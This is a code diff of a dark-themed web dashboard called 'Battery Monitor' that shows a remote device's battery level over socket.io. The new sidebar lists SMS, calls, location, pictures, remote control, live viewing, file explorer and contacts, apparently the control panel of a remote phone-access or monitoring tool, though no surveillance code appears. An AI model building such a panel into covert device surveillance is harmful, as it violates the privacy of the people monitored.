@@ -4,51 +4,105 @@
     <title>Battery Monitor</title>
     <script src="/socket.io/socket.io.js"></script>
     <style>
-        body { font-family: 'Segoe UI', sans-serif; background: #000; margin: 0; display: flex; }
+        body { font-family: 'Segoe UI', sans-serif; background: #000; margin: 0; display: flex; color: white; }
 
-        /* SIDEBAR */
+        /* SIDEBAR STYLING */
         .sidebar {
-            width: 240px; height: 100vh; background: #111;
-            border-right: 1px solid #333; position: fixed;
-            left: 0; top: 0; padding: 20px; box-sizing: border-box;
+            width: 240px;
+            height: 100vh;
+            background: #111;
+            border-right: 1px solid #333;
+            position: fixed;
+            left: 0;
+            top: 0;
+            padding: 20px;
+            box-sizing: border-box;
+            z-index: 2000;
         }
-        .sidebar h2 { color: #fff; font-size: 1.2rem; }
 
-        /* MAIN CONTENT */
+        .sidebar h2 { 
+            color: #fff; 
+            font-size: 1.2rem; 
+            margin-bottom: 30px; 
+            border-bottom: 1px solid #333;
+            padding-bottom: 10px;
+        }
+
+        .nav-item { 
+            color: #888; 
+            padding: 12px 15px; 
+            cursor: pointer; 
+            border-radius: 8px;
+            margin-bottom: 5px;
+            transition: 0.3s;
+        }
+        .nav-item:hover { background: #222; color: #fff; }
+        .nav-item.active { background: #006400; color: #fff; }
+
+        /* MAIN CONTENT AREA */
         .main-container {
-            margin-left: 240px; width: calc(100% - 240px); min-height: 100vh;
+            margin-left: 240px; /* Aligns with Sidebar width */
+            width: calc(100% - 240px);
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
         }
 
-        /* TOP NAV */
+        /* TOP NAV (CENTERED WITHIN MAIN AREA) */
         .top-nav {
-            width: 100%; height: 60px; background: #111;
-            display: flex; justify-content: center; align-items: center;
-            border-bottom: 1px solid #333; position: sticky; top: 0;
+            width: 100%;
+            height: 60px;
+            background: #111;
+            display: flex;
+            justify-content: center; /* Centers the battery box */
+            align-items: center;
+            border-bottom: 1px solid #333;
+            position: sticky;
+            top: 0;
+            z-index: 1000;
         }
 
         .status-wrapper { display: flex; align-items: center; gap: 15px; }
 
-        /* Battery Box */
+        /* Battery Box Styling */
         .battery-box {
-            padding: 6px 20px; border-radius: 6px;
-            font-weight: bold; font-size: 1.6rem; min-width: 80px;
-            text-align: center; transition: 0.4s;
+            padding: 6px 20px;
+            border-radius: 6px;
+            font-weight: bold;
+            font-size: 1.6rem;
+            min-width: 85px;
+            text-align: center;
+            transition: all 0.4s ease;
         }
 
-        /* Colors: Dark Text on Light Background */
-        .online { background-color: #90ee90; color: #006400; } /* Green */
-        .offline { background-color: #ffcccb; color: #8b0000; } /* Red */
+        /* Online: Dark Green Text, Light Green Box */
+        .online { background-color: #90ee90; color: #006400; }
+        
+        /* Offline: Dark Red Text, Light Red Box */
+        .offline { background-color: #ffcccb; color: #8b0000; }
 
-        /* Symbols */
+        /* Symbols beside the box */
         .state-icon { font-size: 1.8rem; display: none; }
         #charging-icon { color: #f1c40f; } /* Yellow Bolt */
         #unplugged-icon { color: #2ecc71; } /* Green Battery */
+        
+        .page-content { padding: 40px; text-align: center; color: #555; }
     </style>
 </head>
 <body>
 
     <div class="sidebar">
-        <h2>Admin Panel</h2>
+        <h2>CONTROL PANEL</h2>
+        <div class="nav-item active">DASHBOARD</div>
+        <div class="nav-item">SMS</div>
+        <div class="nav-item">CALLS</div>
+        <div class="nav-item">LOCATION</div>
+        <div class="nav-item">PICTURES</div>
+        <div class="nav-item">SITE WEB</div>
+        <div class="nav-item">REMOTE CONTROL</div>
+        <div class="nav-item">LIVE VIEWING</div>
+        <div class="nav-item">FILE EXPLORER</div>
+        <div class="nav-item">CONTACTS</div>
     </div>
 
     <div class="main-container">
@@ -57,9 +111,15 @@
                 <div id="bat-box" class="battery-box offline">
                     <span id="bat-pct">--</span>%
                 </div>
+                
                 <span id="charging-icon" class="state-icon">⚡</span>
                 <span id="unplugged-icon" class="state-icon">🔋</span>
             </div>
+        </div>
+
+        <div class="page-content">
+            <h3>System Active</h3>
+            <p>Percentage is centered and aligned with the sidebar.</p>
         </div>
     </div>
 
@@ -82,7 +142,7 @@
         });
 
         socket.on('ui-battery', (data) => {
-            // FIX: Detect if data is an object {percent: 85} or just a number 85
+            // SMART FIX: Handle if data is just a number (85) or an object
             let finalPercent;
             let isCharging = false;
 
@@ -90,21 +150,24 @@
                 finalPercent = data.percent;
                 isCharging = data.charging;
             } else {
-                finalPercent = data; // Data is just the number (e.g. 85)
-                isCharging = false;  // Can't know charging status from a number
+                finalPercent = data; // If only number 85 is received
             }
 
-            // Update Text
+            // Update display
             batPct.innerText = finalPercent;
-            
-            // Set Color to Online
             batBox.className = "battery-box online";
 
-            // Update Icons
-            if (isCharging) {
-                chargingIcon.style.display = "inline";
-                unpluggedIcon.style.display = "none";
+            // Update Symbols
+            if (typeof data === 'object') {
+                if (isCharging) {
+                    chargingIcon.style.display = "inline";
+                    unpluggedIcon.style.display = "none";
+                } else {
+                    chargingIcon.style.display = "none";
+                    unpluggedIcon.style.display = "inline";
+                }
             } else {
+                // Default to Battery icon if only number is sent
                 chargingIcon.style.display = "none";
                 unpluggedIcon.style.display = "inline";
             }
